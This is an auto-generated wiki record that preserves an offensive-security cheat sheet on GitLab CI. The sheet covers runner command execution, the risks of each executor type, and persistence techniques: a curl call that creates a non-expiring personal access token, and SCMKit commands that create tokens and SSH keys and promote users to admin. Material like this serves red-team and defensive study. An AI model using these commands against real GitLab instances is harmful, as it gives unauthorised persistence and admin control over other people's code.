---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# CI/CD - Gitlab CI

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-devops-cicd-gitlab-ci` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/devops/cicd-gitlab-ci.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CI/CD - Gitlab CI](../../topics/devops/ci-cd-gitlab-ci.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-devops-cicd-gitlab-ci |
| name | CI/CD - Gitlab CI |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/devops/cicd-gitlab-ci.md |

## Preserved Source Material

````yaml
_body: "# CI/CD - Gitlab CI\n\nGitLab CI (Continuous Integration) is a built-in feature of GitLab that automates the process\
  \ of building, testing, and deploying your code every time you make a change. It's part of GitLab CI/CD, which stands for\
  \ Continuous Integration / Continuous Deployment.\n\n## Gitlab Runners\n\n```ps1\nsudo apt-get install gitlab-runner\nsudo\
  \ gitlab-runner register\n```\n\n| Prompt              | Example Input                                            |\n| -------------------\
  \ | -------------------------------------------------------- |\n| GitLab instance URL | `https://gitlab.com/`          \
  \                          |\n| Registration token  | Found in your project under `Settings > CI/CD > Runners` |\n| Executor\
  \            | `shell`, `docker`, etc.                                  |\n| Description         | `my-remote-runner`  \
  \                                     |\n| Tags                | `remote`                                              \
  \   |\n\nThe `.gitlab-ci.yml` file is the configuration file that GitLab CI/CD uses to define your pipelines, jobs, and\
  \ stages.\n\n### Command Execution Jobs\n\nGitlab-CI \"Command Execution\" example: `.gitlab-ci.yml`\n\n```yaml\nstages:\n\
  \    - test\n\ntest:\n    stage: test\n    script:\n        - |\n            whoami\n    parallel:\n        matrix:\n  \
  \          - RUNNER: VM1\n            - RUNNER: VM2\n            - RUNNER: VM3\n    tags:\n        - ${RUNNER}\n```\n\n\
  ### List GitLab Runners\n\nList all GitLab runners available to the current user in GitLab.\n\n```ps1\nSCMKit.exe -s gitlab\
  \ -m listrunner -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listrunner -c apikey -u\
  \ https://gitlab.something.local\n```\n\n## Gitlab Executors\n\n* **Shell** executor: The jobs are run with the permissions\
  \ of the GitLab Runner’s user and can steal code from other projects that are run on this server.\n* **Docker** executor:\
  \ Docker can be considered safe when running in non-privileged mode.\n* **SSH** executor: SSH executors are susceptible\
  \ to MITM attack (man-in-the-middle), because of missing `StrictHostKeyChecking` option.\n\n## Gitlab CI/CD Variables\n\n\
  CI/CD Variables are a convenient way to store and use data in a CI/CD pipeline, but variables are less secure than secrets\
  \ management providers.\n\n## Persistence\n\n* [xforcered/SCMKit](https://github.com/xforcered/SCMKit) - Source Code Management\
  \ Attack Toolkit\n\n### Personal Access Token\n\nCreate a PAT (Personal Access Token) as a persistence mechanism for the\
  \ Gitlab instance.\n\n* Manual\n\n    ```ps1\n    curl -k --request POST --header \"PRIVATE-TOKEN: apiToken\" --data \"\
  name=user-persistence-token\" --data \"expires_at=\" --data \"scopes[]=api\" --data \"scopes[]=read_repository\" --data\
  \ \"scopes[]=write_repository\" \"https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens\"\n    ```\n\n* Using\
  \ `SCMKit.exe`: Create/List/Delete an access token to be used in a particular SCM system\n\n    ```ps1\n    SCMKit.exe -s\
  \ gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName\n    SCMKit.exe -s gitlab\
  \ -m createpat -c apikey -u https://gitlab.something.local -o targetUserName\n    SCMKit.exe -s gitlab -m removepat -c userName:password\
  \ -u https://gitlab.something.local -o patID\n    SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local\
  \ -o targetUser\n    SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser\n    ```\n\
  \n* Get the assigned privileges to an access token being used in a particular SCM system\n\n    ```ps1\n    SCMKit.exe -s\
  \ gitlab -m privs -c apiKey -u https://gitlab.something.local\n    ```\n\n### SSH Keys\n\n* Create/List an SSH key to be\
  \ used in a particular SCM system\n\n    ```ps1\n    SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local\
  \ -o \"ssh public key\"\n    SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o \"ssh\
  \ public key\"\n    SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local\n    SCMKit.exe\
  \ -s gitlab -m listsshkey -c apiToken -u https://github.something.local\n    SCMKit.exe -s gitlab -m removesshkey -c userName:password\
  \ -u https://gitlab.something.local -o sshKeyID\n    SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local\
  \ -o sshKeyID\n    ```\n\n### User Promotion\n\n* Promote a normal user to an administrative role in a particular SCM system\n\
  \n    ```ps1\n    SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName\n\
  \    SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName\n    SCMKit.exe -s gitlab\
  \ -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName\n    ```\n\n## Tools\n\n* [praetorian-inc/glato](https://github.com/praetorian-inc/glato)\
  \ - GitLab Attack TOolkit\n\n## References\n\n* [Security for self-managed runners - Gitlab](https://docs.gitlab.com/runner/security/)"
_relative_path: devops/cicd-gitlab-ci.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/devops/cicd-gitlab-ci.md
````
